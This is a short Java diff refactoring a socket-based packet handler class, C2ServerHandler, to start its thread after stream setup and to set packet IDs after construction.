@@ -24,19 +24,14 @@ public class C2ServerHandler extends Thread
         this.c2socket = c2socket;
     }
 
-    public C2ServerHandler begin()
-    {
-        start();
-        return this;
-    }
-
-    public void start()
+    public void init()
     {
         try
         {
             running = true;
             dis = new DataInputStream(c2socket.getInputStream());
             dos = new DataOutputStream(c2socket.getOutputStream());
+            start();
         } catch (Exception ex) {
             ex.printStackTrace(System.err);
         }
@@ -51,7 +46,8 @@ public class C2ServerHandler extends Thread
                 int packetID = dis.readInt();
                 if (debugMode) System.out.println("[LoginPass] C2 received packet: " + packetID);
                 Class<? extends AbstractPacket> packetClass = PacketRegistry.getPacketClass(packetID);
-                AbstractPacket packet = packetClass.getConstructor().newInstance(packetID);
+                AbstractPacket packet = packetClass.getConstructor().newInstance();
+                packet.packetID = packetID;
                 packet.setC2Handler(this);
                 packet.readData(dis);
                 packet.handlePacket(packetHandler);
